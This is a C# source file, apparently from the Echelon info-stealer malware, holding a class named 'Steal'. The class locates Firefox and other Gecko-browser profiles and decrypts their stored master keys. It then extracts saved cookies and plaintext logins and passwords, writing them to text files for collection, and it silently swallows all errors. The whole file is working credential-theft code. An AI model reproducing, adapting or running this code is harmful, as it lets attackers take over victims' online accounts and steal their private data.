
using System;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Echelon
{
    internal class Steal
    {
        public static int count;
        public static int count_cookies = 0;
        public static List<string> domains = new List<string>();
        public static List<string> Cookies_Gecko = new List<string>();
        public static List<string> passwors = new List<string>();
        public static List<string> credential = new List<string>();
        public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");
        public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

        public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

        public static readonly byte[] Key4MagicNumber = new byte[16]
           {
            248,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1
           };


        public static List<string> GeckoBrowsers = new List<string>();

        public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
        {
            var list = new List<string>();
            if (files == null || files.Length == 0 || level > maxLevel) return list;
            try
            {
                var directories = Directory.GetDirectories(baseDirectory);
                foreach (var path in directories)
                    try
                    {
                        var directoryInfo = new DirectoryInfo(path);
                        var files2 = directoryInfo.GetFiles();
                        var flag = false;
                        for (var j = 0; j < files2.Length; j++)
                        {
                            if (flag) break;
                            for (var k = 0; k < files.Length; k++)
                            {
                                if (flag) break;
                                var a = files[k];
                                var fileInfo = files2[j];
                                if (a == fileInfo.Name)
                                {
                                    flag = true;
                                    list.Add(fileInfo.FullName);
                                }
                            }
                        }
                        foreach (var item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                            if (!list.Contains(item)) list.Add(item);
                        directoryInfo = null;
                    }
                    catch 
                    {
                    }

                return list;
            }
            catch 
            {
                return list;
            }
        }

        public static void Creds(string profile, string browser_name, string profile_name)
        {
            try
            {
                if (File.Exists(Path.Combine(profile, "key3.db"))) Lopos(profile, p3k(CreateTempCopy(Path.Combine(profile, "key3.db"))), browser_name, profile_name);

                Lopos(profile, p4k(CreateTempCopy(Path.Combine(profile, "key4.db"))), browser_name, profile_name);

            }
            catch (Exception)
            {

            }
        }

        public static void Cookies()
        {      
            var list2 = new List<string>();
            list2.AddRange(FindPaths(LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
            list2.AddRange(FindPaths(RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));

            foreach (var item in list2)
            {
                var fullName = new FileInfo(item).Directory.FullName;
                var text = item.Contains(RoamingAppData) ? prbn(fullName) : plbn(fullName);
                var profile_name = GetName(fullName);

                CookMhn(fullName, text, profile_name);

                var result = "";

                foreach (var a in Cookies_Gecko) result += a;

                if (result != "") File.WriteAllText(Help.Cookies + "\\Cookies_Mozilla.txt", result, Encoding.Default);
            }            
        }


        public static void Passwords()
        {
            

            var list2 = new List<string>();
            list2.AddRange(FindPaths(LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
            list2.AddRange(FindPaths(RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
            foreach (var item in list2)
            {
                var fullName = new FileInfo(item).Directory.FullName;
                var text = item.Contains(RoamingAppData) ? prbn(fullName) : plbn(fullName);
                var profile_name = GetName(fullName);

                Creds(fullName, text, profile_name);

                var result = "";

                foreach (var a in GeckoBrowsers) result += a + Environment.NewLine;

                if (result != "") File.WriteAllText(Help.Passwords + "\\Passwords_Mozilla.txt", result, Encoding.Default);
            }
          //  Console.ReadKey();
        }

        private static string GetName(string path)
        {
            try
            {
                var array = path.Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);

                return array[array.Length - 1];

            }
            catch 
            {
            }
            return "Unknown";
        }

        public static string CreateTempCopy(string filePath)
        {
            var text = CreateTempPath();
            File.Copy(filePath, text, true);
            return text;
        }

        public static string CreateTempPath()
        {
            return Path.Combine(TempDirectory, "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode() + Thread.CurrentThread.ManagedThreadId);
        }

        //   public static List<string> GeckoCookies = new List<string>();


        public static void CookMhn(string profile, string browser_name, string profile_name)
        {


            try
            {
                var text = Path.Combine(profile, "cookies.sqlite");

                var cNT = new CNT(CreateTempCopy(text));
                cNT.ReadTable("moz_cookies");
                for (var i = 0; i < cNT.RowLength; i++)
                    try
                    {
                        domains.Add(cNT.ParseValue(i, "host").Trim());
                        Cookies_Gecko.Add(cNT.ParseValue(i, "host").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "expiry").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" + cNT.ParseValue(i, "value") + Environment.NewLine);


                        //Console.WriteLine(cNT.ParseValue(i, "host").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "expiry").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" + cNT.ParseValue(i, "value") + System.Environment.NewLine);
                    }
                    catch
                    {
                    }
            }
            catch (Exception)
            {

            }
        }

        public static void Lopos(string profile, byte[] privateKey, string browser_name, string profile_name)
        {
            try
            {
                var path = CreateTempCopy(Path.Combine(profile, "logins.json"));
                if (File.Exists(path))
                {
                    foreach (JsonValue item in File.ReadAllText(path).FromJSON()["logins"])
                    {

                        var Gecko4 = Gecko1.Create(Convert.FromBase64String(item["encryptedUsername"].ToString(false)));
                        var Gecko42 = Gecko1.Create(Convert.FromBase64String(item["encryptedPassword"].ToString(false)));
                        var text = Regex.Replace(Gecko6.lTRjlt(privateKey, Gecko4.Objects[0].Objects[1].Objects[1].ObjectData, Gecko4.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
                        var text2 = Regex.Replace(Gecko6.lTRjlt(privateKey, Gecko42.Objects[0].Objects[1].Objects[1].ObjectData, Gecko42.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);


                        credential.Add("URL : " + item["hostname"] + Environment.NewLine + "Login: " + text + Environment.NewLine + "Password: " + text2 + Environment.NewLine);
                        GeckoBrowsers.Add("URL : " + item["hostname"] + Environment.NewLine + "Login: " + text + Environment.NewLine + "Password: " + text2 + Environment.NewLine);
                        count++;
                    }
                    for (var i = 0; i < credential.Count(); i++)
                        //passwors.Add("Browser : " + browser_name + System.Environment.NewLine + "Profile : " + profile_name + System.Environment.NewLine + credential[i]);
                        GeckoBrowsers.Add("Browser : " + browser_name + Environment.NewLine + "Profile : " + profile_name + Environment.NewLine + credential[i]);
                    // Console.WriteLine("Browser : " + browser_name + System.Environment.NewLine + "Profile : " + profile_name + System.Environment.NewLine + credential[i]);
                    credential.Clear();
                }
            }
            catch (Exception)
            {
            }
        }

        private static byte[] p4k(string file)
        {
            var result = new byte[24];
            try
            {
                if (!File.Exists(file)) return result;
                var cNT = new CNT(file);
                cNT.ReadTable("metaData");
                var s = cNT.ParseValue(0, "item1");
                var s2 = cNT.ParseValue(0, "item2)");
                var Gecko4 = Gecko1.Create(Encoding.Default.GetBytes(s2));
                var objectData = Gecko4.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
                var objectData2 = Gecko4.Objects[0].Objects[1].ObjectData;
                var Gecko8 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
                Gecko8.го7па();
                Gecko6.lTRjlt(Gecko8.DataKey, Gecko8.DataIV, objectData2);
                cNT.ReadTable("nssPrivate");
                var rowLength = cNT.RowLength;
                var s3 = string.Empty;
                for (var i = 0; i < rowLength; i++)
                    if (cNT.ParseValue(i, "a102") == Encoding.Default.GetString(Key4MagicNumber))
                    {
                        s3 = cNT.ParseValue(i, "a11");
                        break;
                    }

                var Gecko42 = Gecko1.Create(Encoding.Default.GetBytes(s3));
                objectData = Gecko42.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
                objectData2 = Gecko42.Objects[0].Objects[1].ObjectData;
                Gecko8 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
                Gecko8.го7па();
                result = Encoding.Default.GetBytes(Gecko6.lTRjlt(Gecko8.DataKey, Gecko8.DataIV, objectData2, PaddingMode.PKCS7));
                return result;
            }
            catch (Exception)
            {
                return result;
            }
        } //Если P4Key

        private static byte[] p3k(string file)
        {
            var array = new byte[24];
            try
            {
                if (!File.Exists(file)) return array;
                new DataTable();
                var berkeleyDB = new Gecko9(file);
                var Gecko7 = new Gecko7(vbv(berkeleyDB, x => x.Equals("password-check")));
                var hexString = vbv(berkeleyDB, x => x.Equals("global-salt"));
                var Gecko8 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), ConvertHexStringToByteArray(Gecko7.EntrySalt));
                Gecko8.го7па();
                Gecko6.lTRjlt(Gecko8.DataKey, Gecko8.DataIV, ConvertHexStringToByteArray(Gecko7.Passwordcheck));
                var Gecko4 = Gecko1.Create(ConvertHexStringToByteArray(vbv(berkeleyDB, x => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
                var Gecko82 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), Gecko4.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
                Gecko82.го7па();
                var Gecko42 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(Gecko82.DataKey, Gecko82.DataIV, Gecko4.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
                if (Gecko42.Objects[0].Objects[3].ObjectData.Length <= 24)
                {
                    array = Gecko42.Objects[0].Objects[3].ObjectData;
                    return array;
                }
                Array.Copy(Gecko42.Objects[0].Objects[3].ObjectData, Gecko42.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
                return array;
            }
            catch (Exception)
            {
                return array;
            }
        } //Если P3Key

        public static byte[] ConvertHexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0) throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hexString));
            var array = new byte[hexString.Length / 2];
            for (var i = 0; i < array.Length; i++)
            {
                var s = hexString.Substring(i * 2, 2);
                array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }
            return array;
        } //По названию думай

        private static string vbv(Gecko9 berkeleyDB, Func<string, bool> predicate)
        {
            var text = string.Empty;
            try
            {
                foreach (var key in berkeleyDB.Keys)
                    if (predicate(key.Key)) text = key.Value;
            }
            catch (Exception)
            {
            }
            return text.Replace("-", string.Empty);
        }

        private static string prbn(string profilesDirectory)
        {
            var text = string.Empty;
            try
            {
                var array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Roaming\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = !(array[2] == "Profiles") ? array[0] : array[1];
            }
            catch (Exception)
            {
            }
            return text.Replace(" ", string.Empty);
        }

        private static string plbn(string profilesDirectory)
        {
            var text = string.Empty;
            try
            {
                var array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Local\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = !(array[2] == "Profiles") ? array[0] : array[1];
            }
            catch (Exception)
            {
            }
            return text.Replace(" ", string.Empty);
        }
    }
}
